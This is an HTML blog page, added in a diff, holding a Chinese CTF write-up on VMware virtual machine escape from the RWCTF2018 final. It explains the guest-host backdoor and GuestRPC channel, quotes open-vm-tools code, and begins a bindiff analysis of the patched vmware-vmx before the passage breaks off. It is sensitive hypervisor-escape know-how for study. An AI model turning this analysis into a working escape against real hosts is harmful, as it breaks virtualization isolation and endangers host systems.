@@ -1,0 +1,838 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/head.png">
+  <link rel="icon" href="/img/head.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+    <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Epiphany">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="本文首发于奇安信攻防社区 ： https:&#x2F;&#x2F;forum.butian.net&#x2F;share&#x2F;1666  0x01 概述虚拟化技术逐渐的开源和云计算的需要，使得虚拟化迅速发展，从KVM，XEN到qemu，docker…等，。 服务和软件定义网络的理念模糊了开发和运维的界限，也把更多的安全问题带入到虚拟化技术中。更多基础设施即服务（Iaas）管理平台的问题以及云供应商的不可控都给虚拟化技术的安全应用">
+<meta property="og:type" content="article">
+<meta property="og:title" content="虚拟机逃逸（一）">
+<meta property="og:url" content="http://example.com/2022/06/22/%E8%99%9A%E6%8B%9F%E6%9C%BA%E9%80%83%E9%80%B8%EF%BC%88%E4%B8%80%EF%BC%89/index.html">
+<meta property="og:site_name" content="Epiphany&#39;s blog">
+<meta property="og:description" content="本文首发于奇安信攻防社区 ： https:&#x2F;&#x2F;forum.butian.net&#x2F;share&#x2F;1666  0x01 概述虚拟化技术逐渐的开源和云计算的需要，使得虚拟化迅速发展，从KVM，XEN到qemu，docker…等，。 服务和软件定义网络的理念模糊了开发和运维的界限，也把更多的安全问题带入到虚拟化技术中。更多基础设施即服务（Iaas）管理平台的问题以及云供应商的不可控都给虚拟化技术的安全应用">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://i.bmp.ovh/imgs/2022/06/11/55bab3ee7a10d74b.png">
+<meta property="og:image" content="https://i.bmp.ovh/imgs/2022/06/11/3a60818ae9d00e21.png">
+<meta property="og:image" content="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-8c778cb84b93e2c11fe15cbc508a537bd365b3e7.png">
+<meta property="og:image" content="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-d11ec0897a90dd8c3ffacd41ebf25d705c91d72f.png">
+<meta property="og:image" content="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-7d058ac9547b0c5f1d39ba965dd9b771c627d9fb.png">
+<meta property="og:image" content="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-213799f6fc4e4063222b7f27d7ff3bf3d6a95b52.png">
+<meta property="og:image" content="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-b60e6ffb7fa00eee453237c55f8b52c31cdb4593.png">
+<meta property="og:image" content="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-61000bff1bf24027f6e26da3bdf1ea5dfc805946.png">
+<meta property="og:image" content="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-a3f065bd71745da225b1c04c4a6d034e89f421c8.png">
+<meta property="og:image" content="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-bb838684db02dce7205e00d839ff208fed7e2264.png">
+<meta property="og:image" content="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-d6bea8ffd78640f22c86266f875cf6f17ba55736.png">
+<meta property="og:image" content="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-028a1df016d78ca5454c36d7bdd28d0c504175cb.png">
+<meta property="og:image" content="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-8b5cc9e9d5519e804249233cc339cad6311cbed7.png">
+<meta property="og:image" content="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-62745268f78c644e67b21e14deae7cda0e266705.png">
+<meta property="og:image" content="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-00e8aa2fa4011e8f00639154c8b15f85401f4144.png">
+<meta property="og:image" content="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-1f029b2200ee309814087c541c99b32c5e947019.png">
+<meta property="og:image" content="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-f0b3c90d5cbd2ef6d9dc12653e0de4722512a24b.png">
+<meta property="og:image" content="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-406d37c691e6e5004ec90acb50ec506407d0b61b.png">
+<meta property="og:image" content="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-a8120d076ec4a58750eae4727ea33c426a91e60b.png">
+<meta property="og:image" content="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-ec9d59dfbc0332422eecfd0c0d60b445d286bc22.png">
+<meta property="og:image" content="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-8d71666bf6ee066a3c9f34c2a562979dee1b3712.png">
+<meta property="og:image" content="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-cff1a526e7d67d1e98b8cef0b48deda4cc636949.png">
+<meta property="og:image" content="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-71e566d153b0ff7626917e269648509ed147bf23.png">
+<meta property="og:image" content="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-fe93a41ccc7f68586129dd5cb19d8944c5f17d54.png">
+<meta property="article:published_time" content="2022-06-21T16:43:02.000Z">
+<meta property="article:modified_time" content="2022-06-21T16:48:29.823Z">
+<meta property="article:author" content="Epiphany">
+<meta property="article:tag" content="CTF">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://i.bmp.ovh/imgs/2022/06/11/55bab3ee7a10d74b.png">
+  
+  
+  
+  <title>虚拟机逃逸（一） - Epiphany&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.2","typing":{"enable":true,"typeSpeed":70,"cursorChar":"😊","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.2.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Epiphany&#39;s blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item dropdown">
+              <a class="nav-link dropdown-toggle" target="_self" href="javascript:;" role="button"
+                 data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+              <div class="dropdown-menu" aria-labelledby="navbarDropdown">
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" target="_blank" rel="noopener" href="https://hexo.fluid-dev.com/">
+                    
+                    CTF
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" target="_blank" rel="noopener" href="https://hexo.fluid-dev.com/">
+                    
+                    CVE
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" target="_blank" rel="noopener" href="https://hexo.fluid-dev.com/">
+                    
+                    chats
+                  </a>
+                
+              </div>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="虚拟机逃逸（一）"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2022-06-22 00:43" pubdate>
+          星期三, 六月 22日 2022, 12:43 凌晨
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          <!-- compatible with older versions-->
+          23k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          <!-- compatible with older versions-->
+          193 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="leancloud-page-views"></span> 次
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">虚拟机逃逸（一）</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <blockquote>
+<p>本文首发于奇安信攻防社区 ： <a target="_blank" rel="noopener" href="https://forum.butian.net/share/1666">https://forum.butian.net/share/1666</a></p>
+</blockquote>
+<h2 id="0x01-概述"><a href="#0x01-概述" class="headerlink" title="0x01 概述"></a>0x01 概述</h2><p>虚拟化技术逐渐的开源和云计算的需要，使得虚拟化迅速发展，从KVM，XEN到qemu，docker…等，。</p>
+<p>服务和软件定义网络的理念模糊了开发和运维的界限，也把更多的安全问题带入到虚拟化技术中。更多基础设施即服务（Iaas）管理平台的问题以及云供应商的不可控都给虚拟化技术的安全应用带来阻碍，而真正的虚拟化安全要从虚拟化技术本身谈起。</p>
+<p>早期的虚拟化提出的是，宿主机和虚拟机之间的隔离，但是随着技术的发展，两机之间的通信让这种隔离变得模糊化，无论是FTP还是共享机制，都给安全带来的较大的挑战，本文针对虚拟机逃逸漏洞进行一个入门级别的分析。</p>
+<h2 id="0x02-如何逃逸"><a href="#0x02-如何逃逸" class="headerlink" title="0x02 如何逃逸"></a>0x02 如何逃逸</h2><p><strong>首先，需要明确提权的模型</strong>，虚拟机逃逸的情况繁多，大致的模型和提权方式都类似。（后续的一些示例表示，非内核态也可以逃逸）</p>
+<ul>
+<li>虚拟机操作系统发送敏感请求，使操作系统陷入内核态</li>
+<li>某些特权指令会进入ring0以下的状态，即交给<code>Hypervisor</code>处理</li>
+<li>利用Hypervisor的脆弱性漏洞使得Hypervisor执行完特权指令后不产生指令状态的返回，使得执行完指令后依然停留在内核态</li>
+<li>实现了提权后，可以渗透到Hypervisor和虚拟机的其他区域，破坏虚拟化的隔离机制，完成逃逸操作。</li>
+</ul>
+<p><strong>了解基本的流程之后，就是理解</strong>。</p>
+<p><img src="https://i.bmp.ovh/imgs/2022/06/11/55bab3ee7a10d74b.png" srcset="/img/loading.gif" lazyload alt="img"><br> 以上是一个虚拟化的基本模型，这里使用的是一个全虚拟化的模型，VMM即hypervisor，提权利用的是特殊指令执行时候会陷入root mode。</p>
+<p>这类指令的存在让提权和逃逸变得可行。总结以上流程，写出一个逃逸需要的基本条件。</p>
+<ol>
+<li>有漏洞的内核，即有可以执行使得陷入hypervisor的指令</li>
+<li>有一次匹配的逃逸，理解为可以使得宿主机弹出一个计算器</li>
+</ol>
+<p>第二点的利用，在不同的虚拟化技术中，不一样，下面以VM ware的逃逸，做一个简单的例子。</p>
+<h2 id="0x03-RWCTF2018-final-VMescape"><a href="#0x03-RWCTF2018-final-VMescape" class="headerlink" title="0x03 RWCTF2018 final VMescape"></a>0x03 RWCTF2018 final VMescape</h2><p>这题是RWCTF2018 final，做一个入手的题目非常的合适。</p>
+<h3 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h3><p>经常使用vmware虚拟机的人一定会熟悉其拖拽功能，即Guest和host之间的文件传递以及复制之类的操作，都是基于拖拽实现的，拖拽的背后是Guest和host之间的通信机制。而Vm类型的逃逸中，利用的就是该通信机制，这类机制被设计是现在了vmtools当中，高版本的vmware，vmtools消失，直接被自带安装。</p>
+<h3 id="backdoor机制"><a href="#backdoor机制" class="headerlink" title="backdoor机制"></a>backdoor机制</h3><p>vmtools中有一个叫做backdoor的接口，该接口被用来实现通信。<a target="_blank" rel="noopener" href="https://sites.google.com/site/chitchatvmback/backdoor">官方文档</a>,github中的开源文档也有<a target="_blank" rel="noopener" href="https://github.com/vmware/open-vm-tools/blob/master/open-vm-tools/lib/backdoor/backdoorGcc64.c#L74-L104">open-vmtools</a>.</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span><br><span class="hljs-title function_">Backdoor_InOut</span><span class="hljs-params">(Backdoor_proto *myBp)</span> <span class="hljs-comment">// IN/OUT</span><br>&#123;<br>   uint64 dummy;<br><br>   __asm__ __volatile__(<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> __APPLE__</span><br>        <span class="hljs-comment">/*</span><br><span class="hljs-comment">         * Save %rbx on the stack because the Mac OS GCC doesn&#x27;t want us to</span><br><span class="hljs-comment">         * clobber it - it erroneously thinks %rbx is the PIC register.</span><br><span class="hljs-comment">         * (Radar bug 7304232)</span><br><span class="hljs-comment">         */</span><br>        <span class="hljs-string">&quot;pushq %%rbx&quot;</span>           <span class="hljs-string">&quot;\n\t&quot;</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>        <span class="hljs-string">&quot;pushq %%rax&quot;</span>           <span class="hljs-string">&quot;\n\t&quot;</span><br>        <span class="hljs-string">&quot;movq 40(%%rax), %%rdi&quot;</span> <span class="hljs-string">&quot;\n\t&quot;</span><br>        <span class="hljs-string">&quot;movq 32(%%rax), %%rsi&quot;</span> <span class="hljs-string">&quot;\n\t&quot;</span><br>        <span class="hljs-string">&quot;movq 24(%%rax), %%rdx&quot;</span> <span class="hljs-string">&quot;\n\t&quot;</span><br>        <span class="hljs-string">&quot;movq 16(%%rax), %%rcx&quot;</span> <span class="hljs-string">&quot;\n\t&quot;</span><br>        <span class="hljs-string">&quot;movq  8(%%rax), %%rbx&quot;</span> <span class="hljs-string">&quot;\n\t&quot;</span><br>        <span class="hljs-string">&quot;movq   (%%rax), %%rax&quot;</span> <span class="hljs-string">&quot;\n\t&quot;</span><br>        <span class="hljs-string">&quot;inl %%dx, %%eax&quot;</span>       <span class="hljs-string">&quot;\n\t&quot;</span>  <span class="hljs-comment">/* NB: There is no inq instruction */</span><br>        <span class="hljs-string">&quot;xchgq %%rax, (%%rsp)&quot;</span>  <span class="hljs-string">&quot;\n\t&quot;</span><br>        <span class="hljs-string">&quot;movq %%rdi, 40(%%rax)&quot;</span> <span class="hljs-string">&quot;\n\t&quot;</span><br>        <span class="hljs-string">&quot;movq %%rsi, 32(%%rax)&quot;</span> <span class="hljs-string">&quot;\n\t&quot;</span><br>        <span class="hljs-string">&quot;movq %%rdx, 24(%%rax)&quot;</span> <span class="hljs-string">&quot;\n\t&quot;</span><br>        <span class="hljs-string">&quot;movq %%rcx, 16(%%rax)&quot;</span> <span class="hljs-string">&quot;\n\t&quot;</span><br>        <span class="hljs-string">&quot;movq %%rbx,  8(%%rax)&quot;</span> <span class="hljs-string">&quot;\n\t&quot;</span><br>        <span class="hljs-string">&quot;popq          (%%rax)&quot;</span> <span class="hljs-string">&quot;\n\t&quot;</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> __APPLE__</span><br>        <span class="hljs-string">&quot;popq %%rbx&quot;</span>            <span class="hljs-string">&quot;\n\t&quot;</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br></code></pre></td></tr></table></figure>
+
+<p>其中有一条特权指令，<code>in</code>，这条指令在正常的操作系统执行会报错，但是在vm中的guest机器执行这条指令，这个异常会被 vmtools捕获，然后传递给<code>vmware-vmx.exe</code>进行通信操作。</p>
+<p><strong>重点在于，backdoor普通用户也可以执行</strong>，所以，guest中，执行相应的代码，让操作系统陷入hypervisor层，然后再利用backdoor和host进行通信，触发此bug。</p>
+<p>通信所需要的函数，再open-vmtools中也有实现。<code>Message_Send</code>和<code>Message_Recv</code>。<a target="_blank" rel="noopener" href="https://github.com/vmware/open-vm-tools/blob/master/open-vm-tools/lib/message/message.c">git链接</a>。</p>
+<p>在某一篇<a target="_blank" rel="noopener" href="http://sysprogs.com/legacy/articles/kdvmware/guestrpc.shtml">文档</a>中，给出了该操作的基本使用.</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-type">unsigned</span> __declspec(naked) GetMousePos()<br>&#123;<br>    __asm<br>    &#123;<br>        mov eax, <span class="hljs-number">564</span>D5868h<br>        mov ecx, <span class="hljs-number">4</span><br>        mov edx, <span class="hljs-number">5658</span>h<br>        in eax, dx<br>        ret<br>    &#125;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">unsigned</span> mousepos = GetMousePos();<br>    <span class="hljs-built_in">printf</span>( <span class="hljs-string">&quot;鼠标光标位置：x=%d,y=%d\n&quot;</span> , mousepos &gt;&gt; <span class="hljs-number">16</span>, mousepos &amp; <span class="hljs-number">0xFFFF</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p>If this program is executed on a real machine, the in instruction  will cause a “privileged instruction” exception, as user-mode code runs  in Ring 3. However, when this program is executed on the virtual  machine, it will print the correct mouse cursor position.</p>
+<p>在真机上会报错，而在虚拟机中，将获得鼠标位置。</p>
+</blockquote>
+<h3 id="GuestRPC-Drag-and-Drop-RPCI"><a href="#GuestRPC-Drag-and-Drop-RPCI" class="headerlink" title="GuestRPC | Drag and Drop RPCI"></a>GuestRPC | Drag and Drop RPCI</h3><p>这是在backdoor基础上实现的更为灵活的通信方式。单个 GuestRPC 调用由一系列请求组成：</p>
+<ul>
+<li>打开 GuestRPC 通道</li>
+<li>发送命令长度</li>
+<li>发送命令数据</li>
+<li>接收回复大小</li>
+<li>接收回复数据</li>
+<li>发出接收结束信号</li>
+<li>关闭频道</li>
+</ul>
+<p>具体的函数实现后面再去分析，这里实际上是实现了一套不那么底层的通信机制。依靠这个机制，guest和host之间可以实现许多有意思的操作，例如：dnd（Drag n Drop）、cp（Copy Paste）操作、发送或获取信息等。</p>
+<p><img src="https://i.bmp.ovh/imgs/2022/06/11/3a60818ae9d00e21.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>再&#x2F;lib&#x2F;include&#x2F;rpcout.h中定义了相关的一些函数，这些函数用来构建和摧毁rpc通道。</p>
+<p>最后的调用追踪如下。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">Rpcout_start-&gt;Message_OpenAllocated-&gt;Backdoor;<br>RpcOut_send-&gt;Message_Send  &amp; Message_Receive;<br></code></pre></td></tr></table></figure>
+
+<p>这几处函数调用对backdoor的操作都是基于一个结构体。<code>Backdoor_proto</code></p>
+<p>在<code>backdoor_types.h</code>中对其有定义。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> DECLARE_REG64_STRUCT \</span><br><span class="hljs-meta">   DECLARE_REG32_STRUCT; \</span><br><span class="hljs-meta">   struct &#123; \</span><br><span class="hljs-meta">      uint32 low; \</span><br><span class="hljs-meta">      uint32 high; \</span><br><span class="hljs-meta">   &#125; words; \</span><br><span class="hljs-meta">   uint64 quad</span><br></code></pre></td></tr></table></figure>
+
+<p>实际上就是对相应的寄存器做一个设置。</p>
+<p>除了以上的函数，vmx还提供了一种面向对象的方法实现以上功能，VMWareRPCChannel类，该类可以在内核和用户模式下使用。</p>
+<blockquote>
+<p>By using <a target="_blank" rel="noopener" href="http://kdvmware.sysprogs.org/dox/a00032.html">VMWareRPCChannel</a> class it is possible to execute arbitrary GuestRPC requests, that  VMWare supports. However, the question of adding our own request types  is still open. Let’s examine the VMWARE-VMX.EXE internals. When a  GuestRPC is being issued by guest, code inside the VMWARE-VMX.EXE  searches the so-called GuestRPC handler table for a handler  corresponding the the issued request. A GuestRPC handler entry format  can be defined by the following structure:</p>
+</blockquote>
+<p>具体的实现这里不赘述，此外长亭的师傅也实现了一套Rpc的通信机制，在其知乎文章有分析。</p>
+<p>通过这个RPCI可以直接向RPC，以往版本的漏洞分析中已经有该DnD漏洞的存在。</p>
+<p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-8c778cb84b93e2c11fe15cbc508a537bd365b3e7.png" srcset="/img/loading.gif" lazyload alt="图片.png"><br> memcpy没有size的判断，导致第二个包可以直接改totalsize为一个大值，这样导致了memcpy的溢出。发送Dnd的代码在dndCPTransportGuestRpc.hpp中，同样可以在open-vmtools里面找到源码。有人总结出了发送路径。</p>
+<blockquote>
+<p>rpcv3util::SendMsg-&gt;DnDCPTransportGuestRpc::SendPacket-&gt;RpcChannel_Send-&gt;Message_Send-&gt;backdoor</p>
+</blockquote>
+<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><h4 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h4><p>题目给出了</p>
+<p>rwctf.ovf、rwctf-disk1.vmdk、rwctf.mf、vmware-vmx-patched、VMware-Workstation-Full-15.0.2-10952284.x86_64.bundle和vmware-vmx</p>
+<p>使用vof vmdk mf可以创建一个题目相同环境的虚拟机，patched即为题目环境的vmx，而bundle安装包中的是给出的vmware-vmx。</p>
+<p>使用bindiff比较patched和原版的不同可以快速定位漏洞位置，bindiff官网在外网，可以在52破解下载。</p>
+<p>使用ida的bindiff插件，然后把diff结果导入bindiff软件即可。</p>
+<p>查看出来的不同有1处，</p>
+<p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-d11ec0897a90dd8c3ffacd41ebf25d705c91d72f.png" srcset="/img/loading.gif" lazyload alt="图片.png"><br> 双击查看函数内容</p>
+<p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-7d058ac9547b0c5f1d39ba965dd9b771c627d9fb.png" srcset="/img/loading.gif" lazyload alt="图片.png"></p>
+<p>可以看到patched地方加入了大部分的nop指令，回到ida仔细分析该流程处nop掉的东西是什么。</p>
+<p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-213799f6fc4e4063222b7f27d7ff3bf3d6a95b52.png" srcset="/img/loading.gif" lazyload alt="图片.png"></p>
+<p>仔细比较发现有一处and被修改，还有一处call之前的一个mov指令被nop掉了，F5回去查看被改掉的位置。</p>
+<p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-b60e6ffb7fa00eee453237c55f8b52c31cdb4593.png" srcset="/img/loading.gif" lazyload alt="图片.png"></p>
+<p>少了一处被置为0的操作，还有一处and操作修改，查看整个函数，大部分都是<code>GuestMsg: Channel</code>之类的东西，以及上面的switch操作，此外报错都是一些协议错误以及格式之类的东西，猜测这里是RPC指令的处理函数。</p>
+<p>然后我就一头扎进了open-vm的源码，，。。</p>
+<p>看了非常久，大概得出一个结构体的模型</p>
+<p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-61000bff1bf24027f6e26da3bdf1ea5dfc805946.png" srcset="/img/loading.gif" lazyload alt="图片.png"></p>
+<p>其中大部分的操作还看不太懂，然后突然想起来查看GuestRPC 的操作流程。</p>
+<ul>
+<li>打开 GuestRPC 通道</li>
+<li>发送命令长度</li>
+<li>发送命令数据</li>
+<li>接收回复大小</li>
+<li>接收回复数据</li>
+<li>发出接收结束信号</li>
+<li>关闭频道</li>
+</ul>
+<p>发现可以和这里的switch对应起来，可以更加清除的理解其内容。</p>
+<p>这里去掉了置0操作，没有将第一处buf置空，第二处把标志改为了21，这里可能是漏洞形成的重点。</p>
+<p>根据正常流程，目标处调用的是这样一个函数。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> __fastcall <span class="hljs-title function_">close_backdoor</span><span class="hljs-params">(__int64 a1, <span class="hljs-type">unsigned</span> __int16 a2, <span class="hljs-type">char</span> 